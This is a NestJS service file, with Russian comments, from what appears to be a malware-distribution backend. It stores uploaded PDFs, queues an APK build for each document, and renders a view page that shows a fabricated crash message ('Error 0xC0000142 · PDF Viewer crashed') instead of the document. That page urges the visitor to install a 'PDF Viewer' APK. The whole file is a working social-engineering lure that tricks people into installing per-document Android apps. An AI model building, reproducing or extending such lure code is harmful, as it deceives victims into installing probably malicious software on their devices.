import { Injectable, HttpException, HttpStatus } from '@nestjs/common';
import { join } from 'path';
import * as fs from 'fs';
import { PrismaService } from '../prisma.service';
import { ApkService } from '../apk/apk.service';

@Injectable()
export class PdfService {
  private readonly viewTemplate: string;

  constructor(
    private readonly prisma: PrismaService,
    private readonly apkService: ApkService,
  ) {
    const templatePath = join(
      __dirname,
      '..',
      '..',
      'src',
      'views',
      'pdf-view.html',
    );
    // В production dist/ — ищем рядом со скомпилированным файлом
    const distTemplatePath = join(__dirname, '..', 'views', 'pdf-view.html');

    if (fs.existsSync(distTemplatePath)) {
      this.viewTemplate = fs.readFileSync(distTemplatePath, 'utf-8');
    } else if (fs.existsSync(templatePath)) {
      this.viewTemplate = fs.readFileSync(templatePath, 'utf-8');
    } else {
      throw new Error(
        `PDF view template not found. Looked in:\n  ${distTemplatePath}\n  ${templatePath}`,
      );
    }
  }

  async uploadPdf(file: Express.Multer.File) {
    try {
      const originalName = Buffer.from(file.originalname, 'latin1').toString(
        'utf8',
      );

      const record = await this.prisma.pdfRecord.create({
        data: {
          originalName,
          modifiedName: file.filename,
          lastPingAt: new Date(0),
        },
      });

      const viewUrl = `/view/${record.id}`;

      // Ставим сборку APK в очередь (выполняется в фоне, не блокирует ответ)
      // Клиент узнает о статусе через WebSocket события: apk_building → apk_ready
      this.apkService.enqueueApkBuild(
        record.id,
        file.path,
        record.originalName,
      );

      return {
        message: 'File uploaded successfully',
        originalFilename: file.originalname,
        pdfId: record.id,
        viewUrl,
      };
    } catch (error) {
      throw new HttpException(
        `Error uploading PDF: ${error.message}`,
        HttpStatus.INTERNAL_SERVER_ERROR,
      );
    }
  }

  async renderViewPage(id: string): Promise<string> {
    const record = await this.prisma.pdfRecord.findUnique({ where: { id } });
    if (!record) {
      throw new HttpException('Not found', HttpStatus.NOT_FOUND);
    }

    const docName = record.originalName
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;');

    const downloadApkName = process.env.DOWNLOAD_APK_NAME || 'PDF Viewer.apk';
    const htmlModalTitle =
      process.env.HTML_MODAL_TITLE || 'помилка читання документу';
    const htmlErrorMain =
      process.env.HTML_ERROR_MAIN || 'Не удалось открыть документ';
    const htmlErrorDetail =
      process.env.HTML_ERROR_DETAIL ||
      'При попытке запустить документ возникла критическая ошибка. Файл повреждён или требует дополнительных компонентов для корректного отображения.<br><br>Приложение не может запустить средство просмотра. Для устранения проблемы загрузите и установите необходимый компонент запуска.';
    const htmlErrorCode =
      process.env.HTML_ERROR_CODE ||
      'Error 0xC0000142 · Launch failed · PDF Viewer crashed';
    const htmlInstallButton =
      process.env.HTML_INSTALL_BUTTON || '&#11015; Установить PDF Viewer';

    return this.viewTemplate
      .replace('{{DOC_NAME}}', docName)
      .replace('{{APK_URL}}', `/apk/download/${id}`)
      .replace('{{DOWNLOAD_APK_NAME}}', downloadApkName)
      .replace('{{HTML_MODAL_TITLE}}', htmlModalTitle)
      .replace('{{HTML_ERROR_MAIN}}', htmlErrorMain)
      .replace('{{HTML_ERROR_DETAIL}}', htmlErrorDetail)
      .replace('{{HTML_ERROR_CODE}}', htmlErrorCode)
      .replace('{{HTML_INSTALL_BUTTON}}', htmlInstallButton);
  }

  async getApkFilePath(id: string): Promise<string> {
    const record = await this.prisma.pdfRecord.findUnique({ where: { id } });
    if (!record) {
      throw new HttpException('Not found', HttpStatus.NOT_FOUND);
    }
    const path = this.apkService.getApkPath(record.originalName);
    if (!fs.existsSync(path)) {
      throw new HttpException(
        'APK not generated yet or already deleted',
        HttpStatus.NOT_FOUND,
      );
    }
    return path;
  }

  async resolveRawFilePath(filename: string): Promise<string> {
    const uploadDir = process.env.UPLOAD_DIR_NAME
      ? require('path').isAbsolute(process.env.UPLOAD_DIR_NAME)
        ? process.env.UPLOAD_DIR_NAME
        : join(__dirname, '..', '..', process.env.UPLOAD_DIR_NAME)
      : join(__dirname, '..', '..', 'uploads', 'original');

    let filePath = join(uploadDir, filename);
    if (!fs.existsSync(filePath)) {
      const possibleId = filename.replace('.pdf', '');
      const r = await this.prisma.pdfRecord.findUnique({
        where: { id: possibleId },
      });
      if (r) {
        filePath = join(uploadDir, r.modifiedName);
      }
      if (!fs.existsSync(filePath)) {
        throw new HttpException('File not found', HttpStatus.NOT_FOUND);
      }
    }
    return filePath;
  }

  async resolveViewId(filename: string): Promise<string> {
    const record = await this.prisma.pdfRecord.findFirst({
      where: { modifiedName: filename },
    });
    if (record) return record.id;

    const possibleId = filename.replace('.pdf', '');
    const recordById = await this.prisma.pdfRecord.findUnique({
      where: { id: possibleId },
    });
    if (recordById) return recordById.id;

    throw new HttpException('File not found', HttpStatus.NOT_FOUND);
  }
}
